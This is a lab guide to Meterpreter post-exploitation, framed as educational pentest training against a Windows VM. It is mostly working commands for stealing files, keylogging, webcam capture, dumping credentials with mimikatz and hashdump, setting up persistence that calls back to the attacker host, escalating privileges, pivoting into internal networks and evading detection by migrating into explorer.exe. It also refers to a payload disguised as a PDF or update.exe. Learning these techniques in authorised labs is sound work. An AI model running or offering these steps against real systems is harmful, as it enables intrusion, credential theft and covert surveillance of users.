# Meterpreter Session Usage Guide

## Getting Started

Once the exploit succeeds, you'll see output like:
```
[*] Sending stage (201798 bytes) to 192.168.56.102
[*] Meterpreter session 1 opened (192.168.56.101:4444 -> 192.168.56.102:49158)
```

This means you have a session!

## Basic Commands

### Session Management

| Command | Description |
|---------|-------------|
| `sessions` | List all active sessions |
| `sessions -i 1` | Interact with session 1 |
| `background` | Background current session (Ctrl+Z) |
| `sessions -k 1` | Kill session 1 |
| `exit` | Exit current session |

### System Information

```bash
# Get system information
meterpreter > sysinfo

# Get current user
meterpreter > getuid

# Get privileges
meterpreter > getprivs

# Get process ID
meterpreter > getpid

# Check if running as admin
meterpreter > getsystem
```

### File System Operations

```bash
# Current directory
meterpreter > pwd

# Change directory
meterpreter > cd C:\\Users

# List files
meterpreter > ls

# List files (detailed)
meterpreter > ls -l

# Download file from victim
meterpreter > download C:\\Users\\IEUser\\Desktop\\secret.txt /tmp/

# Upload file to victim
meterpreter > upload /tmp/tool.exe C:\\Users\\IEUser\\Desktop\\

# Search for files
meterpreter > search -f *.txt
meterpreter > search -f password*
```

### Process Management

```bash
# List processes
meterpreter > ps

# Migrate to another process (more stable)
meterpreter > migrate 1234

# Kill process
meterpreter > kill 1234

# Execute command
meterpreter > execute -f cmd.exe -i -H
```

### Screenshots and Keylogging

```bash
# Take screenshot
meterpreter > screenshot

# Start keylogger
meterpreter > keyscan_start

# Dump keystrokes
meterpreter > keyscan_dump

# Stop keylogger
meterpreter > keyscan_stop
```

### Network Commands

```bash
# Show network interfaces
meterpreter > ipconfig

# Show routing table
meterpreter > route

# Show ARP cache
meterpreter > arp

# Port forwarding
meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.56.102
```

### Webcam (if available)

```bash
# List webcams
meterpreter > webcam_list

# Take snapshot
meterpreter > webcam_snap

# Stream webcam
meterpreter > webcam_stream
```

### Shell Access

```bash
# Drop to Windows command prompt
meterpreter > shell

# Inside cmd.exe, run commands:
C:\> whoami
C:\> ipconfig
C:\> dir

# Exit back to Meterpreter
C:\> exit
```

## Common Post-Exploitation Scenarios

### 1. Reconnaissance

```bash
meterpreter > sysinfo
meterpreter > getuid
meterpreter > ipconfig
meterpreter > ps
meterpreter > ls C:\\Users\\IEUser\\Desktop
```

### 2. Privilege Escalation

```bash
# Try to get SYSTEM
meterpreter > getsystem

# If that doesn't work, try exploits
meterpreter > background
msf6 exploit(multi/handler) > use exploit/windows/local/ms16_075_reflection
msf6 exploit(windows/local/ms16_075_reflection) > set SESSION 1
msf6 exploit(windows/local/ms16_075_reflection) > exploit
```

### 3. Persistence (Maintain Access)

```bash
# Run persistence script
meterpreter > run persistence -X -i 60 -p 4444 -r 192.168.56.101

# Install as service
meterpreter > run metsvc
```

### 4. Credential Harvesting

```bash
# Load mimikatz
meterpreter > load kiwi

# Dump passwords
meterpreter > creds_all

# Dump SAM database
meterpreter > hashdump
```

### 5. Lateral Movement

```bash
# Scan network
meterpreter > run post/multi/gather/ping_sweep RHOSTS=192.168.56.0/24

# Port scan
meterpreter > run auxiliary/scanner/portscan/tcp RHOSTS=192.168.56.0/24
```

## Practical Lab Exercises

### Exercise 1: System Reconnaissance

```bash
# 1. Get system info
meterpreter > sysinfo

# 2. Check current user and privileges
meterpreter > getuid
meterpreter > getprivs

# 3. List running processes
meterpreter > ps

# 4. Check network configuration
meterpreter > ipconfig
```

### Exercise 2: File Operations

```bash
# 1. Navigate to Desktop
meterpreter > cd C:\\Users\\IEUser\\Desktop

# 2. List files
meterpreter > ls

# 3. Search for interesting files
meterpreter > search -f *.txt
meterpreter > search -f *.xlsx

# 4. Download a file
meterpreter > download C:\\Users\\IEUser\\Desktop\\file.txt /tmp/
```

### Exercise 3: Screenshot Capture

```bash
# 1. Take screenshot
meterpreter > screenshot

# 2. File is saved automatically, location shown in output
# Example: Screenshot saved to /home/vagrant/.msf4/loot/20240115_123456_192.168.56.102_screenshot_123456.png

# 3. View on Kali (if GUI available)
# Or download to host and view there
```

### Exercise 4: Shell Access

```bash
# 1. Drop to shell
meterpreter > shell

# 2. Run Windows commands
C:\> whoami
C:\> hostname
C:\> systeminfo
C:\> net user
C:\> net localgroup administrators

# 3. Exit shell
C:\> exit

# Back to Meterpreter
meterpreter >
```

### Exercise 5: Process Migration (Stability)

```bash
# 1. List processes
meterpreter > ps

# 2. Find a stable process (like explorer.exe)
# Note the PID

# 3. Migrate to it
meterpreter > migrate 1234

# Why: If user closes the fake PDF, your session won't die
# Now attached to explorer.exe instead of update.exe
```

## Useful Meterpreter Scripts

### Gather System Information

```bash
meterpreter > run post/windows/gather/enum_system
meterpreter > run post/windows/gather/enum_applications
meterpreter > run post/windows/gather/enum_logged_on_users
```

### Dump Passwords

```bash
# Load Kiwi (mimikatz)
meterpreter > load kiwi

# Dump all credentials
meterpreter > creds_all

# Specific dumps
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets
```

### Network Pivoting

```bash
# Add route through compromised host
meterpreter > run autoroute -s 10.0.0.0/24

# Now you can attack internal network
meterpreter > background
msf6 > use auxiliary/scanner/smb/smb_version
msf6 > set RHOSTS 10.0.0.0/24
msf6 > exploit
```

## Tips and Tricks

### 1. Session Stability

**Problem:** Session dies when user closes window

**Solution:** Migrate to stable process
```bash
meterpreter > ps
# Find explorer.exe or svchost.exe
meterpreter > migrate 1234
```

### 2. Persistence

**Problem:** Need to maintain access after reboot

**Solution:** Install persistence
```bash
meterpreter > run persistence -X -i 60 -p 4444 -r 192.168.56.101
```

### 3. Avoiding Detection

**Best Practices:**
- Migrate to legitimate processes
- Use encrypted communications (already enabled)
- Clean up uploaded files
- Don't run loud scans
- Be aware of antivirus

### 4. Multiple Sessions

If you have multiple compromised machines:
```bash
# List sessions
msf6 > sessions

# Output:
# Id  Name  Type             Information
# --  ----  ----             -----------
# 1         meterpreter x64  NT AUTHORITY\SYSTEM @ WINDOWS-PC1
# 2         meterpreter x64  IEUser @ WINDOWS-PC2

# Interact with specific session
msf6 > sessions -i 1

# Run command on all sessions
msf6 > sessions -c "sysinfo"
```

## Common Issues

### Session Opens Then Dies

**Cause:** update.exe exits or gets killed

**Solution:** Migrate to stable process immediately
```bash
meterpreter > ps
meterpreter > migrate <explorer.exe PID>
```

### "Meterpreter session X is not valid and will be closed"

**Cause:** Connection lost or process died

**Solution:** Re-exploit the target

### Commands Hang

**Cause:** Network latency or process issues

**Solution:**
- Wait or press Ctrl+C
- Try `sessions -i X` to reconnect
- Background and re-interact

## Cleanup

When done with lab:
```bash
# 1. Clean uploaded files
meterpreter > rm C:\\Users\\IEUser\\AppData\\Local\\Temp\\update.exe

# 2. Exit session
meterpreter > exit

# 3. Stop handler
msf6 > exit
```

## Security Note

This is an **educational lab**. All techniques shown are for:
- Learning penetration testing
- Understanding attack methods
- Practicing defensive measures

**Never use these techniques without authorization. Unauthorized access is illegal.**

## Further Learning

| Resource | Description |
|----------|-------------|
| `help` | Show all Meterpreter commands |
| [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/) | Free Metasploit course |
| [Meterpreter Basics](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/) | Official guide |
| [Post-Exploitation](https://www.offensive-security.com/metasploit-unleashed/post-exploitation/) | Advanced techniques |

## Quick Reference

```bash
# Most useful commands
sysinfo              # System information
getuid               # Current user
ps                   # List processes
migrate <PID>        # Move to another process
shell                # Drop to cmd.exe
screenshot           # Capture screen
download <file>      # Get file from victim
upload <file>        # Send file to victim
hashdump             # Dump password hashes
load kiwi            # Load mimikatz
creds_all            # Dump all credentials
background           # Background session (Ctrl+Z)
sessions -i 1        # Return to session 1
exit                 # Close session
```
